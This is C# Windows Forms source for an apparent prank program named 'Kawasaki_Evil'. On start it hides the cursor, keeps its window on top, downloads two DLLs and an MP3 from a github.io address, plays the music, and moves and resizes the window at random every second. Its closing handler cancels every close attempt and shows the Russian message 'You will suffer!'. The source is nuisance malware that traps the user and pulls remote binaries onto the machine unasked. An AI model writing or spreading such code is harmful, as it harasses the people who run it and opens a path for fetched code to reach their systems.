using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Net;
using WMPLib;

namespace Kawasaki_Evil
{

    public partial class Form1 : Form
    {
        private System.Windows.Forms.Timer _timer;
        private int _x = 0;
        private int _y = 0;
        private string mp3Url = "https://lingoiy.github.io/musicca.mp3";
        private string mp3Path = "music.mp3";
        public Form1()
        {
            InitializeComponent();
            
            InitializeTimer();
            Other();
            PlayMusic();
        }
        private void PlayMusic()
        {
            using (WebClient wc = new WebClient())
            {
                wc.DownloadFile(mp3Url, mp3Path);

                WindowsMediaPlayer wmp = new WindowsMediaPlayer();
                wmp.URL = mp3Path;
                wmp.controls.play();
            }
        }
        private void Other()
        {
            this.TopMost = true;
            Cursor.Hide();
            using (WebClient wc = new WebClient())
            {
                wc.DownloadFile("https://lingoiy.github.io/libs/AxInterop.WMPLib.dll", "AxInterop.WMPLib.dll");
                wc.DownloadFile("https://lingoiy.github.io/libs/Interop.WMPLib.dll", "Interop.WMPLib.dll");
            }
        }
        private void InitializeTimer()
        {
            _timer = new System.Windows.Forms.Timer();
            _timer.Interval = 1000; // 1000 мс = 1 сек
            _timer.Tick += new EventHandler(Timer_Tick);
            _timer.Start();
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            Random random = new Random();
            Screen primaryScreen = Screen.PrimaryScreen;
            _x = random.Next(0, primaryScreen.Bounds.Width);
            _y = random.Next(0, primaryScreen.Bounds.Height);

            Location = new Point(_x, _y);

            Size = new Size(random.Next(250, 600), random.Next(250, 800));
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            MessageBox.Show("Ты будешь страдать!", "Kawasaki, Cago, Crico и Estriper");
        }
    }
}
